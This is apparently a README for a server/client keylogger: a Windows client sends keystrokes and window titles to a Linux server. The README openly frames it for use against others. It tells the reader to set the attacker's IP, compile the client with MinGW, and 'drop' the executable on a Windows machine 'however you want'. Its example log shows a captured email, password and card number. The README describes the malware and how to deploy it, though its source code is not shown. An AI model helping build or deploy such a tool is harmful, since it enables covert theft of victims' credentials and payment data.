A simple server/client based keylogger.

The client will connect to the server and start sending keystrokes along with the currently focused window.

The server program runs on your Linux machine and receives the keystrokes, logs them in a file in the `log/` directory (It will be created after first run) and also prints them.

- Currently only has a Windows logger client.
- Server is built for Linux only.

Example log file:

```
>>> cat logs/2023_06_24.txt
		START OF LOG FILE

Date: 2023/06/24
IP Address: 192.168.122.156
========================================================


Focused Window: Downloads

 [LWIN]

Focused Window: Mozilla Firefox

Hope I am not getting keylogged rn [ENTER]


Focused Window: Amazon.com. Spend less. Smile more.  Mozilla Firefox

real@email.com [ENTER]
totallymypassword [ENTER]
748921865213271 05/28 323 [ENTER]
```


# Dependencies

You will need MinGW-w64 to compile the windows executable on Linux.

And obviously normal gcc.

Arch Linux:
```shell
sudo pacman -S mingw-w64 gcc
```

Ubuntu/Debian:
```shell
sudo apt install mingw-w64 gcc
```

# Usage

## Set options

Edit the HOST and PORT in `win_client.c` to the attacker IP and port.

```c
#define HOST "127.0.0.1"    // CHANGE ME
#define PORT 6666           // CHANGE ME
```

## Compile

```shell
make
```

Running `make` will compile both the server and client.
But you can also run `make server` or `make client`.


## Run server

Run the server on whatever port you set.

```shell
./bin/server -p <PORT>
```

After that drop your `win_client.exe` on a Windows machine and run it however you want.
